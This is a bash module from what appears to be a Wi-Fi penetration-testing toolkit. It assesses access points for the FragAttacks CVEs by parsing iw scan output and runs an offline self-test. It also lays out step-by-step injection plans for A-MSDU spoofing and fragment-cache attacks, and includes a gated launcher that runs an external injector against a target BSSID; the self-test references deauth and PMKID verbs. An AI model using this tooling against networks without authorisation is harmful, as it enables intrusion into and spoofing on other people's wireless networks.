# ── FragAttacks (CVE-2020-24586 / 24587 / 24588) ────────────────────────
# The assessment half is pure parsing and always runs. The injection half
# needs a monitor iface that can actually inject, so it follows the same
# gating pattern as the deauth verbs (attack_require + injection proof).
FA_DIR="$TMP_DIR/fragattacks"
FA_FACTS="$FA_DIR/ap_facts.tsv"
FA_PLAN="$FA_DIR/injection_plan.tsv"

# Extract the per-BSS facts the three CVEs are decided on from `iw` scan
# output. RX-only: an `iw scan dump` reads the driver's last scan results and
# puts nothing on the air, so an assessment never becomes a transmission.
fa_parse_iw_scan() {
    local text="$1" bssid="$2"
    local block
    block=$(printf '%s\n' "$text" | awk -v b="$bssid" '
        $1 == "BSS" {
            if (inblk) exit
            if (tolower($2) == tolower(b)) inblk = 1
        }
        inblk { print }
    ')
    [[ -z "$block" ]] && return 1

    local ht="no" amsdu="unknown" akm="unknown" pmf="no" priv="unknown"

    printf '%s\n' "$block" | grep -q 'HT capabilities' && ht="yes"
    printf '%s\n' "$block" | grep -q 'VHT capabilities' && ht="yes"
    printf '%s\n' "$block" | grep -q 'HE capabilities' && ht="yes"

    if printf '%s\n' "$block" | grep -q 'Max AMSDU length: 7935'; then
        amsdu="yes"
    elif printf '%s\n' "$block" | grep -q 'Max AMSDU length: 3839'; then
        amsdu="no"
    elif [[ "$ht" == "yes" ]]; then
        # Fall back to HT Capabilities Info bit 11 ("A-MSDU Supported").
        local cap
        cap=$(printf '%s\n' "$block" |
              awk '/HT capabilities:/{f=1} f && /Capabilities: 0x/{print $2; exit}')
        if [[ -n "$cap" ]]; then
            cap="${cap#0x}"          # 16#0x.. is not valid bash arithmetic
            if (( (16#$cap >> 11) & 1 )); then amsdu="yes"; else amsdu="no"; fi
        fi
    fi
    [[ "$ht" == "no" ]] && amsdu="no"

    printf '%s\n' "$block" | grep -q 'Privacy: yes' && priv="yes"
    printf '%s\n' "$block" | grep -q 'Privacy: no'  && priv="no"

    if printf '%s\n' "$block" | grep -qE 'Authentication suites:.*\bOWE\b'; then
        akm="OWE"
    elif printf '%s\n' "$block" | grep -qE 'Authentication suites:.*\bSAE\b'; then
        if printf '%s\n' "$block" | grep -qE 'Authentication suites:.*\bPSK\b'; then
            akm="PSK-SAE"
        else
            akm="SAE"
        fi
    elif printf '%s\n' "$block" | grep -qE 'Authentication suites:.*802\.1X'; then
        akm="WPA2-ENT"
    elif printf '%s\n' "$block" | grep -qE 'Authentication suites:.*\bPSK\b'; then
        akm="PSK"
    elif [[ "$priv" == "no" ]]; then
        akm="OPEN"
    fi

    # PMF from the RSN Capabilities field: bit 6 MFPR, bit 7 MFPC
    # (IEEE 802.11-2020; confirmed against tshark -V).
    local rsncap
    rsncap=$(printf '%s\n' "$block" | awk '
        /RSN:/ { inrsn = 1 }
        inrsn && /Capabilities:/ {
            for (i = 1; i <= NF; i++) {
                if ($i ~ /^\(?0x[0-9a-fA-F]+\)?$/) {
                    gsub(/[()]/, "", $i)
                    print $i
                    exit
                }
            }
        }
    ')
    if [[ -n "$rsncap" ]]; then
        local v=$(( rsncap ))
        # Bit 7 = MFPC (capable), bit 6 = MFPR (required). Both were mapped
        # to "required" by an over-broad edit, which made every PMF-capable
        # AP report as required.
        (( (v >> 7) & 1 )) && pmf="capable"
        (( (v >> 6) & 1 )) && pmf="required"
    fi

    printf 'BSSID\t%s\n'   "$bssid"
    printf 'HT\t%s\n'      "$ht"
    printf 'AMSDU\t%s\n'   "$amsdu"
    printf 'AKM\t%s\n'     "$akm"
    printf 'PMF\t%s\n'     "$pmf"
    printf 'SOURCE\t%s\n'  "iw-scan-dump"
    return 0
}

# Explicit facts file: either a KEY<TAB>VALUE row (the synthetic-AP path used
# by tests and by an operator pasting a recon row) or a raw iw scan block.
fa_facts_from_file() {
    local file="$1" bssid="$2"
    [[ -f "$file" ]] || return 1
    if grep -qP '^(AMSDU|HT|AKM|PMF)\t' "$file"; then
        printf 'BSSID\t%s\n' "${bssid:-$(awk -F'\t' '$1=="BSSID"{print $2; exit}' "$file")}"
        grep -P '^(HT|AMSDU|AKM|PMF)\t' "$file"
        printf 'SOURCE\t%s\n' "explicit-facts"
        return 0
    fi
    fa_parse_iw_scan "$(cat "$file")" "$bssid"
}

# Last resort before "unknown": the recon CSV knows the AKM but nothing about
# aggregation, so A-MSDU stays unknown and --info says how to resolve it.
fa_facts_from_recon_csv() {
    local bssid="$1" csv
    csv=$(ls -t "$TMP_DIR"/recon/scan-*.csv 2>/dev/null | head -1)
    [[ -n "$csv" ]] || return 1
    local row
    row=$(awk -F', *' -v b="$bssid" '
        toupper($1) == toupper(b) { print; exit }
    ' "$csv")
    [[ -z "$row" ]] && return 1

    local akm="unknown" priv
    priv=$(printf '%s' "$row" | awk -F', *' '{print $6}')
    case "$priv" in
        OPN|"") akm="OPEN" ;;
        WPA3)   akm="SAE" ;;
        WPA2)   akm="PSK" ;;
        WPA)    akm="PSK" ;;
        WEP)    akm="WEP" ;;
    esac
    printf 'BSSID\t%s\n'  "$bssid"
    printf 'HT\t%s\n'     "unknown"
    printf 'AMSDU\t%s\n'  "unknown"
    printf 'AKM\t%s\n'    "$akm"
    printf 'PMF\t%s\n'    "unknown"
    printf 'SOURCE\trecon-csv:%s\n' "$(basename "$csv")"
    return 0
}

fa_facts() {
    local bssid="$1" explicit="${2:-${WIFISTING_FA_FACTS:-}}"
    local mon txt

    if [[ -n "$explicit" ]]; then
        fa_facts_from_file "$explicit" "$bssid" && return 0
    fi

    mon=$(attack_resolve_mon_iface)
    if [[ -n "$mon" ]] && command -v iw >/dev/null 2>&1; then
        txt=$(iw dev "$mon" scan dump 2>/dev/null || true)
        if [[ -n "$txt" ]]; then
            fa_parse_iw_scan "$txt" "$bssid" && return 0
        fi
    fi

    fa_facts_from_recon_csv "$bssid" && return 0

    printf 'BSSID\t%s\n' "$bssid"
    printf 'HT\t%s\n'    "unknown"
    printf 'AMSDU\t%s\n' "unknown"
    printf 'AKM\t%s\n'   "unknown"
    printf 'PMF\t%s\n'   "unknown"
    printf 'SOURCE\t%s\n' "none"
    return 0
}

# The assessment itself: facts in, verdict out. No hardware, no radio.
fa_assess() {
    local facts="$1"
    local bssid amsdu ht akm pmf source
    fv() { printf '%s\n' "$facts" | awk -F'\t' -v k="$1" '$1==k{print $2; exit}'; }
    bssid=$(fv BSSID); amsdu=$(fv AMSDU); ht=$(fv HT)
    akm=$(fv AKM);     pmf=$(fv PMF);     source=$(fv SOURCE)

    printf 'FACT\tbssid\t%s\n'  "${bssid:-?}"
    printf 'FACT\tamsdu\t%s\n'  "${amsdu:-unknown}"
    printf 'FACT\tht\t%s\n'     "${ht:-unknown}"
    printf 'FACT\takm\t%s\n'    "${akm:-unknown}"
    printf 'FACT\tpmf\t%s\n'    "${pmf:-unknown}"
    printf 'FACT\tsource\t%s\n' "${source:-none}"

    # ── CVE-2020-24588: A-MSDU spoofing ──
    # The "is this an A-MSDU" flag lives in the QoS control field, which is
    # not authenticated, so a plaintext frame carried inside an aggregated
    # frame is stripped of its A-MSDU header and delivered as if the AP sent
    # it. Decided entirely by whether the receiver does A-MSDU aggregation.
    case "$amsdu" in
        yes)
            printf 'CVE\t24588\tAPPLIES\t%s\n' \
                "A-MSDU aggregation advertised (Max AMSDU length 7935); the A-MSDU-present bit is not authenticated, so a plaintext frame can be smuggled inside an aggregated frame"
            ;;
        no)
            printf 'CVE\t24588\tNOT_APPLICABLE\t%s\n' \
                "no A-MSDU aggregation advertised (Max AMSDU length 3839 or non-HT); the receiver will not strip an A-MSDU header it never negotiated"
            ;;
        *)
            printf 'CVE\t24588\tUNKNOWN\t%s\n' \
                "A-MSDU support not observable from the available source; resolve with an iw scan dump or an explicit facts row"
            ;;
    esac
    printf 'PASSWORD_REQUIRED\t24588\tno\n'
    printf 'PMF_MITIGATES\t24588\tno\n'

    # ── CVE-2020-24587: mixed key ──
    # Whether a receiver reassembles fragments encrypted under different keys
    # is a receive-path implementation property; it is not advertised, so the
    # honest verdict is "potential" until the live test is run.
    printf 'CVE\t24587\tPOTENTIAL\t%s\n' \
        "receiver reassembles fragments encrypted under different keys; fragmentation support is not advertised, so this needs the mixed-key injection test"
    printf 'PASSWORD_REQUIRED\t24587\tyes\n'
    printf 'PMF_MITIGATES\t24587\tno\n'

    # ── CVE-2020-24586: fragment cache ──
    printf 'CVE\t24586\tPOTENTIAL\t%s\n' \
        "receiver keeps fragments across a (re)association; also a receive-path property, so it needs the reconnect/fragment-cache test"
    printf 'PASSWORD_REQUIRED\t24586\tyes\n'
    printf 'PMF_MITIGATES\t24586\tno\n'

    printf 'NOTE\takm\t%s\n' "${akm:-unknown}"
    printf 'NOTE\tpmf\t%s\n' "${pmf:-unknown}"
    printf 'NOTE\tfamily\tFragAttacks are data-frame/implementation flaws; PMF does not mitigate any of the three\n'
    return 0
}

# The monitor iface this module should use: the one 01_iface.sh recorded, or
# the first interface the kernel already reports in monitor mode. The
# recorded/explicit one always wins, so an operator choice is never
# overridden. attack_require keeps its stricter contract for the capture and
# deauth verbs; the assessment verbs use this so their refusal names the real
# blocker (no injection) instead of a missing bookkeeping file.
attack_resolve_mon_iface() {
    if [[ -n "${MON_IFACE:-}" ]]; then printf '%s\n' "$MON_IFACE"; return 0; fi
    if [[ -f "$TMP_DIR/mon_iface" ]]; then cat "$TMP_DIR/mon_iface"; return 0; fi
    command -v iw >/dev/null 2>&1 || return 0
    iw dev 2>/dev/null | awk '
        /Interface/ { iface=$2 }
        /type monitor/ { print iface; exit }
    '
}

fa_injection_state() {
    local iface="$1"
    [[ -z "$iface" ]] && { printf 'missing\n'; return 0; }
    if [[ "${WIFISTING_INJECTION_VERIFIED:-}" == "1" ]]; then
        printf 'yes\n'; return 0
    fi
    local f="$TMP_DIR/iface_caps_cache/$iface.json"
    [[ -f "$f" ]] || { printf 'unverified\n'; return 0; }
    local v
    v=$(grep -o '"injection":"[^"]*"' "$f" 2>/dev/null | head -1 | sed 's/.*://; s/"//g')
    printf '%s\n' "${v:-unverified}"
}

# Pure gate: prints the refusal reason, or nothing + rc 1 when injection may
# actually run. Mirrors the deauth verbs' requirement (monitor iface + proof
# the adapter can inject) with the reason named instead of a bare failure.
fa_refusal_reason() {
    local iface="$1" injection="$2" tool="$3"
    if [[ -z "$iface" ]]; then
        printf 'no monitor interface — set one up in the iface menu, injection needs monitor mode\n'
        return 0
    fi
    if [[ "$injection" != "yes" ]]; then
        printf 'no injection-verified adapter: %s reports injection=%s, so the frames would never reach the AP (verify with 01_iface.sh --caps-tsv %s)\n' \
            "$iface" "${injection:-unknown}" "$iface"
        return 0
    fi
    if [[ -z "$tool" ]]; then
        printf 'no FragAttacks injector installed — the assessment and the plan are above, but nothing here can craft the frames (the reference tool is the fragattacks proof-of-concept, plus a raw-injection library)\n'
        return 0
    fi
    return 1
}

fa_find_injector() {
    local c p
    for c in fragattacks fragattack; do
        if command -v "$c" >/dev/null 2>&1; then command -v "$c"; return 0; fi
    done
    for p in "$WIFISTING_ROOT/external/fragattacks/fragattack" \
             "$HOME/wifisting/external/fragattacks/fragattack"; do
        [[ -x "$p" ]] && { printf '%s\n' "$p"; return 0; }
    done
    return 1
}

# A root-requiring verb that can already tell it is going to refuse should not
# put a polkit password prompt in front of the user first. Consulted by
# attack_cli_main BEFORE the pkexec branch. Must be silent and side-effect
# free: it only reads capability state.
attack_privilege_not_needed() {
    case "$1" in
        --fragattacks)
            local iface injection
            iface=$(attack_resolve_mon_iface)
            injection=$(fa_injection_state "$iface")
            [[ "$injection" == "yes" ]] || return 0
            fa_find_injector >/dev/null 2>&1 || return 0
            return 1
            ;;
        *) return 1 ;;
    esac
}

fa_injection_plan() {
    local bssid="$1" dur="$2"
    printf 'PLAN\tbssid\t%s\n' "$bssid"
    printf 'PLAN\tduration\t%s\n' "$dur"
    printf 'PLAN\tgate\tmonitor interface plus an injection-verified adapter\n'
    printf 'PLAN\tinjector\t%s\n' "$(fa_find_injector || printf '<none installed>')"
    printf 'PLAN\t24588.frame\tQoS data frame with the A-MSDU-present bit set, carrying one plaintext inner frame\n'
    printf 'PLAN\t24588.effect\treceiver strips the A-MSDU subframe header and delivers the inner frame as if the AP sent it\n'
    printf 'PLAN\t24588.needs_password\tno\n'
    printf 'PLAN\t24588.precondition\ttarget advertises A-MSDU aggregation\n'
    printf 'PLAN\t24587.step.1\tcapture one fragment of a frame under key A\n'
    printf 'PLAN\t24587.step.2\tcapture the remaining fragments of the same frame under key B\n'
    printf 'PLAN\t24587.step.3\treplay both sets so the receiver reassembles across the two keys\n'
    printf 'PLAN\t24587.precondition\tattacker holds valid keys (the fragments must be genuine ciphertext)\n'
    printf 'PLAN\t24586.step.1\tsend the first fragment(s) of a frame as a connected client\n'
    printf 'PLAN\t24586.step.2\tdisconnect and let the victim (re)associate\n'
    printf 'PLAN\t24586.step.3\tsend the remaining fragments so the stale cached ones are reused\n'
    printf 'PLAN\t24586.precondition\tattacker was able to send fragments earlier (valid credentials)\n'
    printf 'PLAN\tevidence\tthe verdicts above come from the parsed AP facts, not from a hoped-for result\n'
    printf 'PLAN\thonesty\ta refused injection is reported as refused, never as a successful attack\n'
}

attack_cli_fragattacks_assess() {
    local bssid="$1" factsfile="${2:-}"
    [[ -z "$bssid" ]] && {
        printf 'usage: --fragattacks-assess BSSID [FACTS_FILE]\n' >&2; return 2
    }
    if [[ ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        printf 'ERROR\tinvalid BSSID: %s\n' "$bssid" >&2; return 2
    fi
    mkdir -p "$FA_DIR"
    local facts
    facts=$(fa_facts "$bssid" "$factsfile")
    printf '%s\n' "$facts" > "$FA_FACTS"
    fa_assess "$facts"
    fa_injection_plan "$bssid" "${3:-0}" | tee "$FA_PLAN"
    return 0
}

attack_cli_fragattacks() {
    local bssid="$1" dur="${2:-60}"
    [[ -z "$bssid" ]] && {
        printf 'usage: --fragattacks BSSID [DURATION]\n' >&2; return 2
    }
    if [[ ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        printf 'ERROR\tinvalid BSSID: %s\n' "$bssid" >&2; return 2
    fi
    if [[ ! "$dur" =~ ^[0-9]+$ ]] || (( dur < 1 )); then
        printf 'ERROR\tduration must be a positive integer of seconds, got: %s\n' "$dur" >&2
        return 2
    fi

    mkdir -p "$FA_DIR"
    local facts iface injection tool
    facts=$(fa_facts "$bssid")
    printf '%s\n' "$facts" > "$FA_FACTS"
    fa_assess "$facts"
    fa_injection_plan "$bssid" "$dur" | tee "$FA_PLAN"

    iface=$(attack_resolve_mon_iface)
    injection=$(fa_injection_state "$iface")
    tool=$(fa_find_injector) || tool=""

    local reason
    reason=$(fa_refusal_reason "$iface" "$injection" "$tool")
    if [[ -n "$reason" ]]; then
        printf 'REFUSE\tfragattacks injection not run: %s\n' "$reason" >&2
        printf 'STATE\tassessed-not-injected\n'
        return 1
    fi

    if ! attack_lock_channel >&2; then
        printf 'ERROR\tcould not lock %s to channel %s — aborting injection\n' \
            "$MON_IFACE" "$TARGET_CHANNEL" >&2
        return 1
    fi
    printf 'INJECT\t%s %s\n' "$tool" "$bssid"
    timeout "$dur" "$tool" --bssid "$bssid" --interface "$iface"
}

# ── iface arbitration ──
# Monitor-only modules compete for one adapter; 01_iface.sh owns the lock.
IFACE_MODULE="$WIFISTING_ROOT/modules/01_iface.sh"
IFACE_LOCK_IFACE=""
iface_lock_release() {
    [[ -n "$IFACE_LOCK_IFACE" ]] || return 0
    "$IFACE_MODULE" --lock-release "$IFACE_LOCK_IFACE" $$ >/dev/null 2>&1
    IFACE_LOCK_IFACE=""
}
# For BLOCKING commands only (the CLI process lives as long as the capture),
# so $$ is the correct holder. The EXIT trap matters: without it a failure
# path that exits directly leaves a ghost lock and blocks every later module.
iface_lock_claim() {
    [[ -x "$IFACE_MODULE" ]] || return 0
    local out
    if ! out=$("$IFACE_MODULE" --lock-claim "$1" "$2" $$ 2>&1); then
        printf 'ERROR\tinterface busy\n%s\n' "$out" >&2
        return 1
    fi
    IFACE_LOCK_IFACE="$1"
    trap iface_lock_release EXIT
    return 0
}

# ── self-test ────────────────────────────────────────────────────────────
# Offline only: no radio, no root, no network. Writes go to a scratch dir
# under $TMP_DIR (shadowed locally) and are removed before returning; the
# real captures/attack, loot/ and state/ trees are never touched.
attack_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }

    local st="$TMP_DIR/selftest-$$"
    rm -rf "$st"; mkdir -p "$st/recon"
    local TMP_DIR="$st"

    # ── privilege classification: which commands need pkexec ──
    attack_needs_root --capture-start;    chk needs-root-capture-start   "$?" "0"
    attack_needs_root --capture-stop;     chk needs-root-capture-stop    "$?" "0"
    attack_needs_root --deauth-broadcast; chk needs-root-deauth-broadcast "$?" "0"
    attack_needs_root --deauth-client;    chk needs-root-deauth-client   "$?" "0"
    attack_needs_root --deauth-flood;     chk needs-root-deauth-flood    "$?" "0"
    attack_needs_root --pmkid;            chk needs-root-pmkid           "$?" "0"
    # ...and the read-only ones must NOT, or the GUI gets a needless prompt.
    attack_needs_root --status-tsv;       chk needs-root-status          "$?" "1"
    attack_needs_root --list-clients-tsv; chk needs-root-list-clients    "$?" "1"
    attack_needs_root --convert;          chk needs-root-convert         "$?" "1"
    attack_needs_root --selftest;         chk needs-root-selftest        "$?" "1"

    # ── recon CSV -> client list, grouped by the target SSID ──
    cat > "$st/recon/scan-1.csv" <<'CSV'
BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
AA:BB:CC:00:00:01, 2026-01-01 10:00:00, 2026-01-01 10:05:00,  6,  54, WPA2, CCMP, PSK, -45, 100, 5, 0.0.0.0, 12, Cafe, 
AA:BB:CC:00:00:02, 2026-01-01 10:00:00, 2026-01-01 10:06:00, 11,  54, WPA2, CCMP, PSK, -60,  50, 0, 0.0.0.0,  8, Cafe, 
AA:BB:CC:00:00:03, 2026-01-01 10:00:00, 2026-01-01 10:07:00, 36,  54, WPA2, CCMP, PSK, -70,  20, 0, 0.0.0.0,  8, Other, 

Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
11:22:33:44:55:66, 2026-01-01 10:00:00, 2026-01-01 10:05:00, -40, 100, AA:BB:CC:00:00:01, 
22:33:44:55:66:77, 2026-01-01 10:00:00, 2026-01-01 10:04:00, -50, 200, AA:BB:CC:00:00:02, 
33:44:55:66:77:88, 2026-01-01 10:00:00, 2026-01-01 10:03:00, -60, 300, AA:BB:CC:00:00:03, 
44:55:66:77:88:99, 2026-01-01 10:00:00, 2026-01-01 10:02:00, -70, 400, (not associated), 
CSV
    # Both BSSIDs advertising ESSID "Cafe" contribute; the "Other" AP is
    # excluded; the unassociated client is never attributed to anybody.
    chk list-clients-by-essid "$(attack_cli_list_clients_tsv AA:BB:CC:00:00:01)" \
        "$(printf '%s\n' \
            $'11:22:33:44:55:66\t-40\t100\t2026-01-01 10:00:00\t2026-01-01 10:05:00' \
            $'22:33:44:55:66:77\t-50\t200\t2026-01-01 10:00:00\t2026-01-01 10:04:00')"
    chk list-clients-unknown-bssid "$(attack_cli_list_clients_tsv AA:BB:CC:00:00:09)" \
        $'INFO\tno stations on aa:bb:cc:00:00:09 in scan-1.csv'
    chk list-clients-no-target "$(attack_cli_list_clients_tsv "")" \
        $'INFO\tno target BSSID set — pick one in Wi-Fi Recon'
    rm -f "$st"/recon/scan-*.csv
    chk list-clients-no-csv "$(attack_cli_list_clients_tsv AA:BB:CC:00:00:01)" \
        $'INFO\tno recon CSV yet — run a scan first'

    # ── argument validation must fire before any hardware is touched ──
    attack_cli_capture_start "" >/dev/null 2>&1
    chk capture-start-no-prefix-rc "$?" "2"
    attack_cli_deauth_client "" >/dev/null 2>&1
    chk deauth-client-no-mac-rc "$?" "2"

    # ── verified stop: success only once the process is really gone ──
    sleep 30 &
    local sp=$!
    attack_kill_pid "$sp" >/dev/null 2>&1
    chk kill-pid-rc "$?" "0"
    chk kill-pid-gone "$([[ -d "/proc/$sp" ]] && echo alive || echo gone)" "gone"

    # ═══════════════════════════════════════════════════════════════
    #  FragAttacks (offline: parsing, assessment, plan, gate)
    # ═══════════════════════════════════════════════════════════════
    local FA_DIR="$st/fragattacks"
    mkdir -p "$FA_DIR"

    # ── iw scan parsing: A-MSDU advertised (Max AMSDU length 7935) ──
    cat > "$st/scan-amsdu.txt" <<'SCAN'
BSS aa:bb:cc:00:00:01 (on wlp5s0)
	freq: 2437
	SSID: Cafe
	RSN:	 * Version: 1
		 * Group cipher: CCMP
		 * Pairwise ciphers: CCMP
		 * Authentication suites: PSK
		 * Capabilities: 16-PTKSA-RC 1-GTKSA-RC (0x004c)
	HT capabilities:
		Capabilities: 0x19ef
			RX LDPC
			Max AMSDU length: 7935 bytes
	BSS aa:bb:cc:00:00:02 (on wlp5s0)
	freq: 2412
	SSID: Legacy
	HT capabilities:
		Capabilities: 0x010c
			Max AMSDU length: 3839 bytes
SCAN
    local f_amsdu f_none
    f_amsdu=$(fa_parse_iw_scan "$(cat "$st/scan-amsdu.txt")" aa:bb:cc:00:00:01)
    f_none=$(fa_parse_iw_scan "$(cat "$st/scan-amsdu.txt")" aa:bb:cc:00:00:02)
    ff() { printf '%s\n' "$2" | awk -F'\t' -v k="$1" '$1==k{print $2; exit}'; }
    chk fa-parse-amsdu       "$(ff AMSDU "$f_amsdu")" "yes"
    chk fa-parse-ht          "$(ff HT "$f_amsdu")" "yes"
    chk fa-parse-akm         "$(ff AKM "$f_amsdu")" "PSK"
    # 0x004c has bit 6 set and bit 7 clear, which under 802.11-2020 is
    # MFPR=1 MFPC=0 -> "required". The mask order was once transposed here,
    # so this check used to assert "capable" for the same bytes.
    chk fa-parse-pmf-required "$(ff PMF "$f_amsdu")" "required"
    chk fa-parse-source      "$(ff SOURCE "$f_amsdu")" "iw-scan-dump"
    # Bit 7 alone (0x0080) is MFPC -> "capable". Both crossings are pinned so
    # a transposed mask cannot satisfy one at the other's expense.
    # $'...' so the \t really is a tab; in plain single quotes it would be a
    # literal backslash-t and the parser would not match the line at all.
    printf '%s\n' 'BSS aa:bb:cc:00:00:09 (on wlp5s0)' $'\tSSID: CapOnly' \
        $'\tRSN:\t * Version: 1' $'\t\t * Group cipher: CCMP' \
        $'\t\t * Pairwise ciphers: CCMP' $'\t\t * Authentication suites: PSK' \
        $'\t\t * Capabilities: 16-PTKSA-RC 1-GTKSA-RC (0x0080)' $'\tHT capabilities:' \
        $'\t\tCapabilities: 0x19ef' $'\t\t\tMax AMSDU length: 7935 bytes' > "$st/scan-cap.txt"
    chk fa-parse-pmf-capable \
        "$(fa_parse_iw_scan "$(cat "$st/scan-cap.txt")" aa:bb:cc:00:00:09 |
           awk -F'\t' '$1=="PMF"{print $2}')" "capable"
    chk fa-parse-no-amsdu    "$(ff AMSDU "$f_none")" "no"
    # Only the addressed BSS is parsed, never the next block in the dump.
    chk fa-parse-isolates-block "$(ff BSSID "$f_none")" "aa:bb:cc:00:00:02"
    # Capabilities bit 11 fallback when iw omits the Max AMSDU line.
    printf '%s\n' 'BSS aa:bb:cc:00:00:03 (on wlp5s0)' \
        '	HT capabilities:' '		Capabilities: 0x0900' > "$st/scan-bit.txt"
    chk fa-parse-bit11-fallback \
        "$(fa_parse_iw_scan "$(cat "$st/scan-bit.txt")" aa:bb:cc:00:00:03 |
           awk -F'\t' '$1=="AMSDU"{print $2}')" "yes"
    printf '%s\n' 'BSS aa:bb:cc:00:00:04 (on wlp5s0)' \
        '	HT capabilities:' '		Capabilities: 0x0100' > "$st/scan-bit0.txt"
    chk fa-parse-bit11-clear \
        "$(fa_parse_iw_scan "$(cat "$st/scan-bit0.txt")" aa:bb:cc:00:00:04 |
           awk -F'\t' '$1=="AMSDU"{print $2}')" "no"
    # Open + PMF required, to check the other two fact axes.
    printf 'BSS aa:bb:cc:00:00:05 (on wlp5s0)\n\tPrivacy: no\n\tRSN:\t * Version: 1\n\t\t * Capabilities: 0x00c0\n' \
        > "$st/scan-open.txt"
    chk fa-parse-open-akm \
        "$(fa_parse_iw_scan "$(cat "$st/scan-open.txt")" aa:bb:cc:00:00:05 |
           awk -F'\t' '$1=="AKM"{print $2}')" "OPEN"
    chk fa-parse-pmf-required \
        "$(fa_parse_iw_scan "$(cat "$st/scan-open.txt")" aa:bb:cc:00:00:05 |
           awk -F'\t' '$1=="PMF"{print $2}')" "required"
    fa_parse_iw_scan "$(cat "$st/scan-amsdu.txt")" 11:22:33:44:55:66 >/dev/null 2>&1
    chk fa-parse-absent-bss-rc "$?" "1"

    # ── synthetic AP row: the explicit facts path ──
    printf '%s\n' $'BSSID\taa:bb:cc:00:00:01' $'HT\tyes' $'AMSDU\tyes' \
        $'AKM\tPSK' $'PMF\tcapable' > "$st/ap-row.tsv"
    chk fa-facts-from-row-amsdu \
        "$(fa_facts_from_file "$st/ap-row.tsv" "" | awk -F'\t' '$1=="AMSDU"{print $2}')" "yes"
    chk fa-facts-from-row-source \
        "$(fa_facts_from_file "$st/ap-row.tsv" "" | awk -F'\t' '$1=="SOURCE"{print $2}')" "explicit-facts"
    # The same file may be a raw iw scan block instead of a facts row.
    chk fa-facts-from-file-scan \
        "$(fa_facts_from_file "$st/scan-amsdu.txt" aa:bb:cc:00:00:01 |
           awk -F'\t' '$1=="AMSDU"{print $2}')" "yes"

    # ── assessment: A-MSDU advertised -> 24588 applies, passwordless ──
    local as_yes as_no as_unk
    as_yes=$(fa_assess "$f_amsdu")
    as_no=$(fa_assess "$f_none")
    af() { printf '%s\n' "$2" | awk -F'\t' -v c="$1" '$1=="CVE" && $2==c{print $3; exit}'; }
    chk assess-24588-applies      "$(af 24588 "$as_yes")" "APPLIES"
    chk assess-24588-not-applicable "$(af 24588 "$as_no")" "NOT_APPLICABLE"
    chk assess-24588-no-password \
        "$(printf '%s\n' "$as_yes" | awk -F'\t' '$1=="PASSWORD_REQUIRED" && $2=="24588"{print $3}')" "no"
    chk assess-24587-potential    "$(af 24587 "$as_yes")" "POTENTIAL"
    chk assess-24586-potential    "$(af 24586 "$as_yes")" "POTENTIAL"
    chk assess-24587-needs-password \
        "$(printf '%s\n' "$as_yes" | awk -F'\t' '$1=="PASSWORD_REQUIRED" && $2=="24587"{print $3}')" "yes"
    chk assess-pmf-does-not-mitigate \
        "$(printf '%s\n' "$as_yes" | awk -F'\t' '$1=="PMF_MITIGATES"{n++} END{print n+0}')" "3"
    chk assess-facts-count "$(printf '%s\n' "$as_yes" | grep -c $'^FACT\t')" "6"
    chk assess-tsv-shape "$(printf '%s\n' "$as_yes" | awk -F'\t' 'NF<3{n++} END{print n+0}')" "0"
    # Unknown A-MSDU support must say UNKNOWN, not guess either way.
    as_unk=$(fa_assess "$(printf '%s\n' $'BSSID\taa:bb:cc:00:00:09' $'HT\tunknown' \
        $'AMSDU\tunknown' $'AKM\tunknown' $'PMF\tunknown' $'SOURCE\tnone')")
    chk assess-24588-unknown "$(af 24588 "$as_unk")" "UNKNOWN"
    chk assess-unknown-names-source \
        "$(printf '%s\n' "$as_unk" | grep -c 'not observable')" "1"

    # ── injection plan and the gate ──
    local fplan
    fplan=$(fa_injection_plan aa:bb:cc:00:00:01 60)
    fp() { printf '%s\n' "$fplan" | awk -F'\t' -v k="$1" '$2==k{print $3; exit}'; }
    chk fa-plan-bssid      "$(fp bssid)" "aa:bb:cc:00:00:01"
    chk fa-plan-duration   "$(fp duration)" "60"
    chk fa-plan-gate       "$(fp gate | grep -c 'injection-verified')" "1"
    chk fa-plan-24588-frame "$(fp 24588.frame | grep -c 'A-MSDU')" "1"
    chk fa-plan-passwordless "$(printf '%s\n' "$fplan" | grep -c $'^PLAN\t24588.needs_password\tno$')" "1"
    chk fa-plan-steps      "$(printf '%s\n' "$fplan" | grep -c $'^PLAN\t24587.step')" "3"
    chk fa-plan-honesty    "$(fp honesty | grep -c 'refused')" "1"
    chk fa-plan-tsv        "$(printf '%s\n' "$fplan" | awk -F'\t' 'NF!=3{n++} END{print n+0}')" "0"

    # Monitor-iface resolution: an explicit/recorded choice always wins over
    # auto-detection, so the assessment verbs cannot silently pick a different
    # adapter than the operator did.
    chk resolve-mon-explicit "$(MON_IFACE=wlan9 attack_resolve_mon_iface)" "wlan9"
    printf '%s\n' wlan8 > "$st/mon_iface"
    chk resolve-mon-recorded "$(MON_IFACE= attack_resolve_mon_iface)" "wlan8"
    rm -f "$st/mon_iface"

    fa_refusal_reason "" yes /usr/bin/fragattacks >/dev/null
    chk fa-refuse-no-iface-rc "$?" "0"
    local fr1 fr2
    fr1=$(fa_refusal_reason wlp5s0 no /usr/bin/fragattacks)
    chk fa-refuse-unverified-rc "$?" "0"
    chk fa-refuse-unverified-names-iface "$(printf '%s' "$fr1" | grep -c 'wlp5s0')" "1"
    chk fa-refuse-unverified-names-state "$(printf '%s' "$fr1" | grep -c 'injection=no')" "1"
    fr2=$(fa_refusal_reason wlp5s0 yes "")
    chk fa-refuse-no-injector-rc "$?" "0"
    chk fa-refuse-no-injector-text "$(printf '%s' "$fr2" | grep -c 'no FragAttacks injector installed')" "1"
    fa_refusal_reason wlp5s0 yes /usr/bin/fragattacks >/dev/null
    chk fa-allow-when-clear-rc "$?" "1"
    # Injection state is read from the shared capability cache, never probed
    # by transmitting. An unknown iface must be "unverified", not "no".
    chk fa-injection-missing-iface "$(fa_injection_state "")" "missing"
    chk fa-injection-unknown-iface "$(fa_injection_state wlan-does-not-exist)" "unverified"

    # ── privilege classification + the no-needless-pkexec guard ──
